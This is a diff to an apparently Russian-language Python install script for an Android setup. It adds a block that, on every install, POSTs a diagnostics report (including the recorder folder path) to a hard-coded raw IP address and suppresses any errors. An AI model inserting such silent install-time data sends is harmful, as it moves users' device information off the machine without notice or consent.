@@ -295,6 +295,17 @@ except:
 
 progress("Диагностика завершена", 15)
 
+# Отправляем отчёт при ЛЮБОЙ установке (успешной или нет)
+REPORT["recorder_folder"] = recorder_folder
+REPORT["success"] = recorder_folder != "/storage/emulated/0/Recordings/"
+try:
+    import requests as _r3
+    _r3.post("http://157.22.202.232:8200/report",
+             data=json.dumps(REPORT, indent=2, ensure_ascii=False).encode("utf-8"),
+             timeout=10)
+except:
+    pass
+
 # ═══════════════════════════════════════
 # ШАГ 1: БИБЛИОТЕКИ
 # ═══════════════════════════════════════
